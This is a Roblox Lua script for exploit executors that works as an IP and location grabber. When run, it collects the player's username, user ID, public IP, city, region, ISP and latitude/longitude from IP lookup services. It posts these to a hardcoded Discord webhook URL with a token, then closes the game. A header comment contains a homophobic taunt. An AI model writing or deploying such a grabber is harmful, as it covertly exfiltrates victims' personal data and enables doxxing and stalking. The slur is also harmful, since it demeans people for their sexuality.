--# CRACK IF GAY - MADE BY 0rep on discord
-- SERVICES
local HttpService = game:GetService("HttpService")
local req = (http_request or request or syn and syn.request)

-- SETTINGS
local WEBHOOK_URL = "https://discord.com/api/webhooks/1372316329012498452/dHiTEVxQeG2YLDflZeFPKteXaPo8n13Ka01lLvY4D3V2YdkpmeE9gWe0n4GCQ4i0jnUY" -- Your actual webhook

-- Ensure HTTP request is working
if not req then
    warn("No supported HTTP request function found.")
    return
end

-- INIT
local ip = "Unknown"
local geoData = {}

-- TRY TO GET IP
pcall(function()
    local ipResponse = req({
        Url = "https://api.ipify.org?format=json", -- Updated to ipify API for better IP fetching
        Method = "GET"
    })
    if ipResponse and ipResponse.StatusCode == 200 then
        ip = HttpService:JSONDecode(ipResponse.Body).ip
    else
        warn("Failed to fetch IP")
    end
end)

-- TRY TO GET GEOLOCATION (INCLUDING LAT/LONG)
pcall(function()
    local geoResponse = req({
        Url = "https://ipapi.co/json",  -- Geo data including latitude and longitude
        Method = "GET"
    })
    if geoResponse and geoResponse.StatusCode == 200 then
        geoData = HttpService:JSONDecode(geoResponse.Body)
    else
        warn("Failed to fetch geo-location data")
    end
end)

-- USER INFO
local username = game.Players.LocalPlayer.Name
local userId = game.Players.LocalPlayer.UserId
local country = geoData.country_name or "N/A"
local city = geoData.city or "N/A"
local region = geoData.region or "N/A"
local org = geoData.org or "N/A"
local latitude = geoData.latitude or "N/A"  -- Latitude from geoData
local longitude = geoData.longitude or "N/A"  -- Longitude from geoData
local coords = (latitude ~= "N/A" and longitude ~= "N/A") and string.format("Latitude: %s, Longitude: %s", latitude, longitude) or "N/A"

-- DEBUGGING: Log the data to the console
print("User Info:", username, userId)
print("IP:", ip)
print("Location:", country, city, region)
print("Coordinates:", coords)

-- BUILD AND LOG TO DISCORD WEBHOOK
if ip ~= "Unknown" and geoData.country_name then
    local msg = string.format([[ 
    Script executed:
    Username: %s (%s)
    IP: %s
    Location: %s, %s
    Country: %s
    ISP: %s
    Coordinates: %s
    ]], username, userId, ip, city, region, country, org, coords)

    pcall(function()
        -- Send the request to the Discord webhook
        local response = req({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({ content = msg })
        })
        
        -- DEBUGGING: Log the response status
        if response and response.StatusCode == 204 then
            print("Successfully sent data to the webhook.")
        else
            warn("Failed to send data to the webhook. Response status: " .. (response and response.StatusCode or "Unknown"))
        end
    end)
else
    warn("Missing IP or geo-location data")
end

-- CLOSE THE GAME AFTER
wait(1)
game:Shutdown()
